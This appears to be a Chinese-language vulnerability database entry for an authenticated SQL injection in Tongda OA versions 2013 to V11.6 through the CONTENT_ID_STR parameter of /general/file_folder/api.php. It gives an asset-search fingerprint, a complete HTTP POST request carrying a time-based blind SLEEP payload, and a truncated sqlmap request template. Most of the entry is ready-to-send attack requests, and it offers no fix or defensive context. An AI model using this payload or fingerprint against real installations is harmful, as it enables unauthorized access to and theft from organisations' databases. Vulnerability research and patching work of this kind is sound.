# 通达OACONTENT_ID_STR存在后台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/file_folder/api.php HTTP/1.1`

**请求体 / payload**
```
利用条件：可登录系统的账户，普通权限即可\

登陆后台使用获取到的cookie进行测试
Cookie: {cookie}
Host: {hostname}
x-requested-with: XMLHttpRequest
Content-Length: 82
x-wvs-id: Acunetix-Deepscan/209
content-type: application/x-www-form-urlencoded; charset=UTF-8
CONTENT_ID_STR=-@`'` AND (SELECT 8678 FROM (SELECT(SLEEP(5)))UUxI)&SORT_ID=59&FILE_SORT=1&action=sign

sqlmap
POST /general/file_folder/api.php HTTP/1.1
Cookie: {cookie}
Host: {hostname}
x-requested-with: XMLHttpRequest
Content-Length: 82
x-wvs-id: Acunetix-Deepscan/209
content-type: application/x-www-form-urlencoded; charset=UTF-8
CONTENT_ID_STR=-@`'`%20&SORT_ID=59&FILE…（脚本共 619 字，完整版见原文）
```

**其他**
- 通达OA CONTENT\_ID\_STR存在后台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2013-通达OAV11.6